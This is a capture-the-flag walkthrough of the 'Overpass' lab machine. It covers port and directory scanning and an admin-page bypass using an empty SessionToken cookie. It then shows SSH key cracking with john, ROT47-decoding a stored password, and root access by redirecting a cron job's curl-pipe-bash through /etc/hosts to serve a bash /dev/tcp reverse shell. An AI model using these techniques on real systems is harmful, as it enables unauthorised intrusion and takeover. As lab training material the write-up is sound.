# Overpass

## Enumeration

Start off with an nmap scan that looks like this:

```vim
nmap -Pn -sV -sC -v <IP_ADDR>
```

Your result should look something like this:

```vim
Nmap scan report for 10.10.110.245
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that this is an Ubuntu machine and there is a web server running on it.

Looking at the web server, we see that this is a website about an application called Overpass, which is a password manager made in Golang. I run a feroxbuster against the IP which looks like this:

```vim
feroxbuster -u http://<IP_ADDR> -q -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o overpass.buster
```

I get the following output on `overpass.buster`:

```vim
200      GET       53l      195w     2431c http://10.10.110.245/
301      GET        0l        0w        0c http://10.10.110.245/img => img/
301      GET        0l        0w        0c http://10.10.110.245/downloads => downloads/
301      GET        0l        0w        0c http://10.10.110.245/aboutus => aboutus/
301      GET        2l        3w       42c http://10.10.110.245/admin => /admin/
301      GET        0l        0w        0c http://10.10.110.245/css => css/
301      GET        0l        0w        0c http://10.10.110.245/downloads/src => src/
301      GET        0l        0w        0c http://10.10.110.245/downloads/builds => builds/
```

Here, `/admin` seems to be interesting which isn't publically available, however I decide to look into application first and see if something there is exploitable. In `/downloads/src/overpass.go`, we can find the source code for the application where we see this line of interesting code:

```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
...
```

The fabled "military grade" encryption was just ROT47. However, since the application isn't reaching back to the website, it doesn't serve any use to us.

## Exploit

Looking into `/admin` we come across the following in the source code:

```html
...
<script src="[/main.js](view-source:http://10.10.232.143/main.js)"></script>
<script src="[/login.js](view-source:http://10.10.232.143/login.js)"></script>
<script src="[/cookie.js](view-source:http://10.10.232.143/cookie.js)"></script>
</head>
```

The page calls some javascript files, which could be aiding the whole process. `main.js` and `cookie.js` didn't contain anything out of the ordinary but `login.js` seemed to have a major flaw in its code:

```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Here, after the username and password are sent to `/api/login`, a variable called `statusOrCookie` holds the response for the login request and does a check if the response is `"Incorrect Credentials"` or not. If true, you get denied access, but if false then you get access (This is by setting `statusOrCookie` to the response received from login request).

The problem in this code is that, there is no check on what kind of value the cookie should have. This means that as long as we have a cookie called `SessionToken`, we get access to `/admin`.

Create a cookie called `SessionToken`, leave it blank and put the path as `/` and reload `/admin`. On reload, we should be given access to the admin page where we are greeted with an encrypted ssh private key.

Copy the ssh key to a file called `id_rsa` and run the following:

```vim
ssh2john id_rsa > hash && john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

This should be giving you the password for the ssh private key, which is `james13`. To login to the ssh session, try the following command:

```vim
ssh james@<IP> -i id_rsa
```

This should take you to the home directory of james, and you should find user flag in `user.txt`.

## Priv-Esc

There happens to be a file called `todo.txt` which contains the following:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

This confirms 2 things:
- Overpass has the password of james stored in it (Could be helpful for `sudo -l` )
- There is an automated buildscript working on the machine (Probably crontab)

Lets try the first option first and try to check `sudo -l` :

### Method 1 (Read .overpass and ROT47 decode):

The first method is to read the `.overpass` file in the home directory of james and  perform ROT47 decode on it.

```vim
~/.overpass:
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.

ROT47 decode:
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

### Method 2 (Run Overpass):

Run overpass and view all the passwords stored.

```vim
james@overpass-prod:~$ overpass
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
System   saydrawnlyingpicture
```

Unfortunately for us, `sudo -l` isn't an option as james cannot run `sudo` so we have to look into crontabs.

### Crontab:

Run `cat /etc/crontab`:

```vim
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The crontab is probably doing DNS resolution for `overpass.thm` via `/etc/hosts`. Usually you need `sudo` to edit this file, but in this machine, everyone can edit `/etc/hosts`. Do the following change

```vim
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm    #Replace 127.0.0.1 with your IP
# The following lines are desirable for IPv6 capable hosts
...
```

On your machine, make directories called `downloads` and `src` so that we are able to replicate the path in the crontab and add a reverse shell code in `buildscript.sh`

```vim
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Set up `nc -lvnp <PORT>` and a python web server in a directory containing your newly created `downloads` file with the following command `python -m http.server 80`.

In a minute, you should be getting a reverse shell back. Root flag can be found in `root.txt`
